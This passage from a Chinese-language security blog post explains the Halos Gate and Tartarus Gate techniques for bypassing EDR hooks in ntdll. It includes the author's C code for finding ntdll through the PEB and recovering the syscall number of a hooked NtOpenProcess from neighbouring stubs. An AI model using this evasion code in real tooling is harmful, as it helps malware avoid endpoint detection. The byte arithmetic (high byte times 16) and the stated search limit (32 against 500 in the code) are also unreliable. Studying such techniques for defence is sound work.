</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xe9</span>) {
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// Search beginning pattern of syscall stub through 500 function up and down from our location
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">for</span> (WORD index <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; index <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">500</span>; index<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Search the begining of a syscall stub in the next function down
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoDown) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoDown) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoDown) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoDown) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoDown) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoDown) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
</span></span><span style="display:flex;"><span>   BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoDown);
</span></span><span style="display:flex;"><span>   BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoDown);
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// substract the index from the current syscall identifier to find the one of our target function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low <span style="color:#f92672">-</span> index;
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Search the begining of a syscall stub in the next function down
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoUp) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoUp) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoUp) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoUp) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoUp) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoUp) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
</span></span><span style="display:flex;"><span>   BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoUp);
</span></span><span style="display:flex;"><span>   BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> index <span style="color:#f92672">*</span> GoUp);
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// substract the index from the current syscall identifier to find the one of our target function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low <span style="color:#f92672">+</span> index;
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>代码里定义了最大搜索跳数为 32，搜索时确实需要注意边界。Halos Gate 也有个小局限性，它以第一条指令是否是 jmp 从而判断函数是否被 hook 了。我们之前说了，不同的 EDR 覆盖的指令不同，有的 EDR 覆盖的不是第 1 条指令，可以是 syscall 之前的任何指令。例如 CrowdStrike 覆盖的是第 2 条指令。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155733.png" alt="20240324155733" /></p>
<h4 id="tartarus-gate">
  <strong>Tartarus Gate</strong>
  <a class="anchor" href="#tartarus-gate">#</a>
</h4>
<p>Tartarus Gate 相比 Halos Gate 的改动比较小，主要是考虑了更多 EDR 可能 hook 的情况，例如上面截图所示的情况。对前 4 字节逐一对比，还是相对比较可靠的判断。当然了，hook 导致的指令覆盖可能在 syscall 指令之前的任何字节，如果不放心的话，可以增加更多字节比较。</p>
<p>下面的代码是我个人对动态获取 SSN 的实现：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//Get module handle for ntdll and kernel32 at the same time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GetModule</span>(HMODULE<span style="color:#f92672">*</span> ntdll, HMODULE<span style="color:#f92672">*</span> kernel32)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PPEB peb <span style="color:#f92672">=</span> (PPEB)(<span style="color:#a6e22e">__readgsqword</span>(<span style="color:#ae81ff">0x60</span>));
</span></span><span style="display:flex;"><span> PPEB_LDR_DATA ldr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PPEB_LDR_DATA<span style="color:#f92672">*</span>)((PBYTE)peb <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>); <span style="color:#75715e">//PPEB_LDR_DATA pLdr = pPeb-&gt;Ldr;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PLIST_ENTRY ntdlllistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ldr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>ntdll <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernelbaselistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernel32listentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)kernelbaselistentry);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>kernel32 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)kernel32listentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#a6e22e">QuickGetSSN</span>(PBYTE pFunctionAddress)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> maxOffset <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>; <span style="color:#75715e">// You can adjust this based on your requirements.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">int</span> offset;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ssn_low <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ssn_high <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ssn <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pFunctionAddress[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4C</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8B</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD1</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xB8</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The function is clean</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> ssn <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ID of searched function is: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ssn); 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ssn;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The function is hooked</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Search both upwards and downwards.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span> (offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; offset <span style="color:#f92672">&lt;=</span> maxOffset; <span style="color:#f92672">++</span>offset)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Check upwards.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   PBYTE checkAddress <span style="color:#f92672">=</span> pFunctionAddress <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x20</span> <span style="color:#f92672">*</span> offset);
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> (checkAddress[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4C</span> <span style="color:#f92672">&amp;&amp;</span> checkAddress[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8B</span> <span style="color:#f92672">&amp;&amp;</span> checkAddress[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD1</span> <span style="color:#f92672">&amp;&amp;</span> checkAddress[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xB8</span>)
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    ssn_low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(checkAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>));
</span></span><span style="display:flex;"><span>    ssn_high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(checkAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>));
</span></span><span style="display:flex;"><span>    ssn <span style="color:#f92672">=</span> ssn_low <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> ssn_high <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Clean sequence found upwards at offset -0x%x, SSN of the unhooked function is 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, offset, ssn);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;SSN of searched NTAPI is 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (offset <span style="color:#f92672">+</span> ssn));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ssn<span style="color:#f92672">+</span>offset;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Check downwards.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   checkAddress <span style="color:#f92672">=</span> pFunctionAddress <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x20</span> <span style="color:#f92672">*</span> offset);
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> (checkAddress[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4C</span> <span style="color:#f92672">&amp;&amp;</span> checkAddress[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8B</span> <span style="color:#f92672">&amp;&amp;</span> checkAddress[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD1</span> <span style="color:#f92672">&amp;&amp;</span> checkAddress[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xB8</span>)
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    ssn_low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(checkAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>));
</span></span><span style="display:flex;"><span>    ssn_high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(checkAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>));
</span></span><span style="display:flex;"><span>    ssn <span style="color:#f92672">=</span> ssn_low <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> ssn_high <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Clean sequence found downwards at offset 0x%x, SSN of the unhooked function is 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,offset, ssn);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;SSN of searched NTAPI is 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (offset <span style="color:#f92672">-</span> ssn));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ssn<span style="color:#f92672">-</span>offset;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#a6e22e">GetSSNByName</span>(IN HMODULE hModule, <span style="color:#66d9ef">const</span> CHAR<span style="color:#f92672">*</span> funcName)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PBYTE pBase <span style="color:#f92672">=</span> (PBYTE)hModule;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ssn_low <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ssn_high <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ssn <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER pImgDosHdr <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pBase;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgDosHdr<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS pImgNtHdrs <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)(pBase <span style="color:#f92672">+</span> pImgDosHdr<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgNtHdrs<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> IMAGE_OPTIONAL_HEADER ImgOptHdr <span style="color:#f92672">=</span> pImgNtHdrs<span style="color:#f92672">-&gt;</span>OptionalHeader;
</span></span><span style="display:flex;"><span> PIMAGE_EXPORT_DIRECTORY pImgExportDir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(pBase <span style="color:#f92672">+</span> ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
</span></span><span style="display:flex;"><span> PDWORD FunctionNameArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNames);
</span></span><span style="display:flex;"><span> PDWORD FunctionAddressArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
</span></span><span style="display:flex;"><span> PWORD  FunctionOrdinalArray <span style="color:#f92672">=</span> (PWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pImgExportDir<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  CHAR<span style="color:#f92672">*</span> pFunctionName <span style="color:#f92672">=</span> (CHAR<span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> FunctionNameArray[i]);
</span></span><span style="display:flex;"><span>  PBYTE pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)(pBase <span style="color:#f92672">+</span> FunctionAddressArray[FunctionOrdinalArray[i]]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_stricmp</span>(funcName, pFunctionName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> (pFunctionAddress[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4C</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8B</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD1</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xB8</span>)
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NTAPI %s may not be hooked</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, funcName);
</span></span><span style="display:flex;"><span>    ssn_low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>));
</span></span><span style="display:flex;"><span>    ssn_high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>));
</span></span><span style="display:flex;"><span>    ssn <span style="color:#f92672">=</span> ssn_low <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> ssn_high <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Syscall number of function %s is: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pFunctionName,ssn); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ssn;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NTAPI %s is hooked, check surrounding functions</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, funcName);
</span></span><span style="display:flex;"><span>    ssn <span style="color:#f92672">=</span> <span style="color:#a6e22e">QuickGetSSN</span>(pFunctionAddress);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Syscall number of function %s is: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pFunctionName, ssn); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ssn;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> HMODULE ntdll;
</span></span><span style="display:flex;"><span> HMODULE kernel32;
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">GetModule</span>(<span style="color:#f92672">&amp;</span>ntdll, <span style="color:#f92672">&amp;</span>kernel32);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ntdll base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ntdll);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;kernel32 base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel32);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ssn <span style="color:#f92672">=</span><span style="color:#a6e22e">GetSSNByName</span>(ntdll, <span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;SSN of the NtOpenProcess is 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ssn);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>我们人为地给 NtOpenProcess，以及其前向 2 个函数、后向 3 个函数都进行了指令覆盖来模拟 hook。最终，程序成功地发现前向第 3 个函数是没有被 hook 的，提取了其 SSN 后加上 3，得到了 NtOpenProcess 的 SSN。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155743.png" alt="20240324155743" /></p>
<h3 id="直接调用-syscall">
  <strong>直接调用 Syscall</strong>
  <a class="anchor" href="#%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8-syscall">#</a>
</h3>
